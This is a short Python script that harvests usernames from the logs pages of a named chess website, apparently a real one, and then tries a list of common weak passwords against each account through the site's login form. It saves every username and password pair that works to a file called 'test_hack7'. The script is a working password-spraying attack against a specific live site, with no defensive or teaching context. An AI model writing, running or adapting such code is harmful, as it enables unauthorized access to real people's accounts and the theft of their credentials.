import requests, random

passwords = ['12345', '123467', '12345678', '1234567890', '7777777', '1q2w3e4r', '123321', 'qazwsx']
user_count = 0
i = 0
user_string = ' '
while 1:
    r = requests.get(
       "https://chess-samara.ru/view/index.html?page="+str(i)+"&action=logs",
       headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"}
    ).text
    users = r.split('data-login="')
    users[0] = ''
    for user in users:
        if (not user): continue
        user = user.split('"')[0]
        if (user_string.find(' ' + user + ' ') > -1): continue
        user_string = user_string + user + ' '
        passwords2 = passwords.copy()
        passwords2.append(user + user)
        for password in passwords:
            r = requests.post(
            "https://chess-samara.ru",
             {"function" : "enter", "login" : user, "pswd" : password},
             headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"}
            )
            if (r.text.find("Неправильное имя пользователя (логин) или пароль") == -1):
               myfile = open("test_hack7", "a")
               myfile.write(user + " " + password + "\n")
               myfile.close()
    #        print(r.status_code, user, password)
        user_count = user_count + 1
        print("checked user", user)
        if (user_count % 1 == 0):
           myfile = open("userCount", "w")
           myfile.write(str(user_count))
           myfile.close()
    print("checked page", i)
    i = i + 1